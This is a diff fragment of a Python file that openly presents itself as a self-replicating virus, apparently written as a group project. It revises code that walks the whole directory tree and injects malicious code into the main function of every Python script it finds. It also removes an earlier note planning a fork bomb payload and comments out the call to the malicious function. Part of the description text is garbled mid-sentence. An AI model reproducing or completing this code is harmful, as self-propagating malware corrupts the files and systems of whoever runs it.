@@ -7,12 +7,11 @@ Group Members:  Jess Leal
                 Huaishu Huang
                 Lino Mercado-Esquivias
 
-Description:    Self Replicating Virus
-                A virus that infects other python scripts. It takes malicious
+Description:    BitCrusher Virus
+                A self-replicating virus that infects other python scripts. It
+                infects the entire directory tree in aIt takes malicious
                 code and injects it at the beginning of the main function of 
                 other python scripts.
-
-Future Work:    1) Add malicious function (i.e. fork bomb)
 --------------------------------------------------------------------------------
 '''
 
@@ -22,9 +21,9 @@ import re
 import os
 import sys
 from glob import glob
+from time import sleep
 from typing import List
 # MALICIOUS SEGMENT END
-from time import sleep
 
 # MALICIOUS SEGMENT BEGIN
 # collects malicious code and returns it as a list
@@ -60,10 +59,13 @@ def print_progress_bar(iteration, total, length=50, fill='█'):
 # MALICIOUS SEGMENT BEGIN
 # recurssively infects every file and subdirectory in the current directory
 def infect_directory(path, virus_payload):
-    # infect current directory
+    # first calculate directory tree size to properly display progress bar
     infection_count = 0
     directory_count = 0
+    print("Calculating directory tree size. This might take a while...")
     total_directories = sum(1 for _ in os.walk(path))
+
+    # infect current directory
     print("Infecting computer...")
     for current_directory, subdirectories, files in os.walk(path):
         
@@ -163,5 +165,5 @@ current_directory = os.getcwd()
 infect_directory(current_directory, virus_payload)
 
 # step 3: malicious function
-malicious_function()
+# malicious_function()
 # MALICIOUS SEGMENT END
